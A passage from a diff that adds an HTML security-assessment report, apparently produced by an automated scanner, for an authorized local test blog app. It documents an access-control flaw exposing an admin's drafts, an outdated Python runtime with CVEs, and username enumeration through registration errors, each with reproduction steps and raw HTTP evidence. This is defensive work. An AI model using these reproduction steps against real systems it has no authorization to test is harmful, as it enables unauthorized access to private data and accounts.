+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;Edit Draft&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/edit_draft/1&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;title&quot;&gt;Title&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;title&quot; maxlength=&quot;100&quot; minlength=&quot;1&quot; name=&quot;title&quot; required type=&quot;text&quot; value=&quot;admin_draft&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;content&quot;&gt;Content&lt;/label&gt;
+            &lt;textarea class=&quot;form-control form-control-lg&quot; id=&quot;content&quot; name=&quot;content&quot; required&gt;
+&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Save Draft&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 4. [idor] Broken access control: non-admin user can read the admin's private drafts via /admin/drafts</h3>
+<div class="kv">Screen: <code>s-0009</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The /admin/drafts route enforces only authentication, not authorization. Logged in as the regular non-admin user &quot;test&quot; (whose own dashboard redirects to /test/drafts), a GET to /admin/drafts returns HTTP 200 with the page titled &quot;admin's Drafts&quot; listing the admin user's private draft (admin_draft, with an edit link to /edit_draft/1). Any authenticated user, regardless of role, can read the admin's private drafts — a broken object/function-level access control (vertical privilege escalation). Anonymous access is correctly redirected to login, so this is reachable by any logged-in low-privilege user, not an anonymous bypass. probe_params found no hidden object-reference parameter; the route is hardcoded to the admin's drafts. This is a distinct endpoint from the already-recorded username-parameterised IDOR at /{username}/drafts.</div>
+<div><b>Reproduction</b></div><pre>1. Log in as the regular user &quot;test&quot;. Confirm identity: GET /dashboard → 302 redirect to /test/drafts (ev-mqzdgpmh-3o), i.e. the session is the non-admin user &quot;test&quot;.
+2. Negative control (no session): GET /admin/drafts with no auth → 302 redirect to /?next=%2Fadmin%2Fdrafts, 235 bytes, no draft data (ev-mqzdg2ls-3l).
+3. Attack (as test): GET /admin/drafts → 200, 1370 bytes, body titled &quot;admin's Drafts&quot; listing admin_draft and /edit_draft/1 (ev-mqzdg33j-3n, replayed at ev-mqzdg2lt-3m and ev-mqzdgqh8-3p — stable).
+Result: the non-admin user &quot;test&quot; reads the admin's private drafts. Fix: enforce an admin role check on /admin/* routes, not just login.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdg2ls-3l</code> — <code>artifacts/s-0009/ev-mqzdg2ls-3l/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/drafts HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 235
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:27:31 GMT
+location: /?next=%2Fadmin%2Fdrafts
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/?next=%2Fadmin%2Fdrafts&quot;&gt;/?next=%2Fadmin%2Fdrafts&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdg33j-3n</code> — <code>artifacts/s-0009/ev-mqzdg33j-3n/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/drafts HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1370
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:27:32 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;admin's Drafts&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;admin's Drafts&lt;/h2&gt;
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+            &lt;li class=&quot;list-group-item&quot;&gt;
+                &lt;h3&gt;admin_draft&lt;/h3&gt;  
+                &lt;a href=&quot;/edit_draft/1&quot; class=&quot;btn btn-primary&quot;&gt;View and Edit&lt;/a&gt;
+            &lt;/li&gt;
+        
+    &lt;/ul&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdg2lt-3m</code> — <code>artifacts/s-0009/ev-mqzdg2lt-3m/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/drafts HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1370
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:27:31 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;admin's Drafts&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;admin's Drafts&lt;/h2&gt;
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+            &lt;li class=&quot;list-group-item&quot;&gt;
+                &lt;h3&gt;admin_draft&lt;/h3&gt;  
+                &lt;a href=&quot;/edit_draft/1&quot; class=&quot;btn btn-primary&quot;&gt;View and Edit&lt;/a&gt;
+            &lt;/li&gt;
+        
+    &lt;/ul&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdgqh8-3p</code> — <code>artifacts/s-0009/ev-mqzdgqh8-3p/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/drafts HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1370
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:28:02 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;admin's Drafts&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;admin's Drafts&lt;/h2&gt;
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+            &lt;li class=&quot;list-group-item&quot;&gt;
+                &lt;h3&gt;admin_draft&lt;/h3&gt;  
+                &lt;a href=&quot;/edit_draft/1&quot; class=&quot;btn btn-primary&quot;&gt;View and Edit&lt;/a&gt;
+            &lt;/li&gt;
+        
+    &lt;/ul&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 5. [vulnerable-component] Outdated &amp; EOL Python 3.8.17 runtime — multiple known CVEs (CVE-2024-7592, CVE-2024-8088, CVE-2024-6232, CVE-2024-0397, CVE-2024-4032, CVE-2023-40217)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">VERSION-BASED finding (matched by the HTTP Server response banner, not exploited). fingerprint_scan of http://target.local:5003/ returned `server: Werkzeug/3.0.6 Python/3.8.17`, disclosing the interpreter as CPython 3.8.17. Two issues: (1) Python 3.8 reached END-OF-LIFE on 2024-10-07 and receives no further security patches; (2) 3.8.17 is also behind the final 3.8 patch (3.8.20), missing fixes that landed in 3.8.18/3.8.19/3.8.20. Concrete CVEs affecting 3.8.17, several directly relevant to a web app: CVE-2024-7592 (quadratic-complexity / CPU-DoS in `http.cookies` parsing backslash-quoted cookie values; fixed 3.8.20); CVE-2024-8088 (infinite-loop DoS in `zipfile.Path`; fixed 3.8.20); CVE-2024-6232 (ReDoS in tarfile/`re` header parsing; fixed 3.8.20); CVE-2024-0397 (race / memory-corruption in the `ssl` module SSLContext cert store; fixed 3.8.19); CVE-2024-4032 (`ipaddress` private/global address misclassification; fixed 3.8.19); CVE-2023-40217 (`ssl` pre-handshake unauthenticated-data read / TLS-handshake bypass; fixed 3.8.18). Worst confident impact is DoS / TLS-handshake bypass — no confident interpreter-level RCE — hence medium, weighted up by EOL status. Note the `Server: Werkzeug/x Python/x` banner is emitted by Werkzeug's built-in development server, so this interpreter is exposed directly to clients. Operator should verify the exact installed micro-version on the host before relying on this. Remediation: migrate off EOL 3.8 to a supported patched line (3.12/3.13), or at minimum 3.8.20 short-term; suppress the version banner / run behind a production WSGI server.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:5003/create_draft (or any app page) and inspect the response `Server` header. 2. Observe `Server: Werkzeug/3.0.6 Python/3.8.17` (captured via fingerprint_scan of the root and confirmed across stable replays of /create_draft). 3. Cross-reference Python 3.8.17 against python.org changelog / NVD: 3.8 is EOL (2024-10-07) and 3.8.17 predates fixes in 3.8.18–3.8.20 (CVE-2023-40217, CVE-2024-0397, CVE-2024-4032, CVE-2024-6232, CVE-2024-7592, CVE-2024-8088).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqze3vkz-4q</code> — <code>artifacts/_/ev-mqze3vkz-4q/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-verdict-xyz HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:46:02 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqze5de0-4r</code> — <code>artifacts/_/ev-mqze5de0-4r/</code></div><div class="lbl">REQUEST</div><pre>GET /create_draft HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1862
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:47:12 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Create Draft&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;Create Draft&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/create_draft&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;title&quot;&gt;Title&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;title&quot; maxlength=&quot;100&quot; minlength=&quot;1&quot; name=&quot;title&quot; required type=&quot;text&quot; value=&quot;&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;content&quot;&gt;Content&lt;/label&gt;
+            &lt;textarea class=&quot;form-control form-control-lg&quot; id=&quot;content&quot; name=&quot;content&quot; required&gt;
+&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Save Draft&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqze5e58-4s</code> — <code>artifacts/_/ev-mqze5e58-4s/</code></div><div class="lbl">REQUEST</div><pre>GET /create_draft HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1862
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:47:13 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Create Draft&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;Create Draft&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/create_draft&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;title&quot;&gt;Title&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;title&quot; maxlength=&quot;100&quot; minlength=&quot;1&quot; name=&quot;title&quot; required type=&quot;text&quot; value=&quot;&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;content&quot;&gt;Content&lt;/label&gt;
+            &lt;textarea class=&quot;form-control form-control-lg&quot; id=&quot;content&quot; name=&quot;content&quot; required&gt;
+&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Save Draft&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 6. [info-disclosure] Username enumeration via registration error message</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The POST /register endpoint discloses whether a username is already registered. Submitting an existing username (e.g. `test`, `admin`) returns HTTP 200 re-rendering the form with the distinct error &quot;Username already exists. Please choose a different one.&quot; (alert-danger), while a free username returns HTTP 302 redirect to &quot;/&quot; with a &quot;Registration successful!&quot; flash. The two responses differ in status (200 vs 302) and body, giving an unauthenticated attacker a reliable oracle to enumerate valid account names (which can then be targeted by password-guessing/credential-stuffing — note the login error messages and the public /&lt;username&gt;/drafts route further confirm valid users). No rate limiting is present to slow such enumeration.</div>
+<div><b>Reproduction</b></div><pre>1. POST /register (no auth) with body username=admin&amp;password=Passw0rd!23&amp;confirm_password=Passw0rd!23&amp;submit=Register → HTTP 200, body contains &quot;Username already exists&quot; (ev-mqzcq1wu-14); repeat with username=test → same marker (ev-mqzcoy4e-12).
+2. Negative control: POST /register with a fresh username=enum_neg_01 (same other fields) → HTTP 302 redirect to &quot;/&quot;, no &quot;Username already exists&quot; marker (ev-mqzcq0ll-13).
+3. The distinct response for existing vs non-existing usernames lets an attacker enumerate valid accounts.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcq0ll-13</code> — <code>artifacts/s-0002/ev-mqzcq0ll-13/</code></div><div class="lbl">REQUEST</div><pre>POST /register HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+username=enum_neg_01&amp;password=Passw0rd!23&amp;confirm_password=Passw0rd!23&amp;submit=Register</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 189
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:07:16 GMT
+location: /
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/&quot;&gt;/&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcoy4e-12</code> — <code>artifacts/s-0002/ev-mqzcoy4e-12/</code></div><div class="lbl">REQUEST</div><pre>POST /register HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+username=test&amp;password=Passw0rd!23&amp;confirm_password=Passw0rd!23&amp;submit=Register</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 2161
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:06:26 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Register&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/register&quot;&gt;Register&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/login&quot;&gt;Login&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+                
+                    &lt;div class=&quot;alert alert-danger&quot;&gt;Username already exists. Please choose a different one.&lt;/div&gt;
+                
+            
+        
+        
+    &lt;h2&gt;Register&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/register&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;username&quot;&gt;Username&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;username&quot; maxlength=&quot;20&quot; minlength=&quot;2&quot; name=&quot;username&quot; required type=&quot;text&quot; value=&quot;test&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;password&quot;&gt;Password&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;password&quot; name=&quot;password&quot; required type=&quot;password&quot; value=&quot;&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;confirm_password&quot;&gt;Confirm Password&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;confirm_password&quot; name=&quot;confirm_password&quot; required type=&quot;password&quot; value=&quot;&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Sign Up&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcq1wu-14</code> — <code>artifacts/s-0002/ev-mqzcq1wu-14/</code></div><div class="lbl">REQUEST</div><pre>POST /register HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+username=admin&amp;password=Passw0rd!23&amp;confirm_password=Passw0rd!23&amp;submit=Register</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 2162
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:07:17 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
